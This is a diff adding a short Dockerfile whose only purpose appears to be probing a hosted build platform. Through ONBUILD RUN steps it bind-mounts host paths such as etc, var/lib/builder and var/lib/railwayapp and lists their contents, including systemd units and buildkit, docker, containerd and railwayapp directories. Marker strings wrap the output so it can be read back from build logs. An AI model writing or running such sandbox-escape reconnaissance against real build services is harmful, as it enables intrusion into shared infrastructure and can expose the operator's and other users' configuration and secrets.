@@ -1,0 +1,6 @@
+FROM alpine:3.20 AS base
+ONBUILD RUN --mount=type=bind,source=etc,target=/hetc sh -c 'set +e; echo "===ETC_BEGIN==="; ls -la /hetc | head -120; echo "--SYSTEMD_UNITS--"; ls -la /hetc/systemd/system 2>&1 | head -60; echo "--SUBDIRS--"; ls -la /hetc/buildkit /hetc/docker /hetc/containerd /hetc/railwayapp /hetc/systemd 2>&1 | head -40; echo "===ETC_END==="'
+ONBUILD RUN --mount=type=bind,source=var/lib/builder,target=/hb sh -c 'set +e; echo "===VB_BEGIN==="; ls -laR /hb 2>&1 | head -150; echo "===VB_END==="'
+ONBUILD RUN --mount=type=bind,source=var/lib/railwayapp,target=/hra sh -c 'set +e; echo "===RA_BEGIN==="; ls -laR /hra 2>&1 | head -100; echo "===RA_END==="'
+FROM base
+RUN sh -c 'echo TRIGGER_Z4'
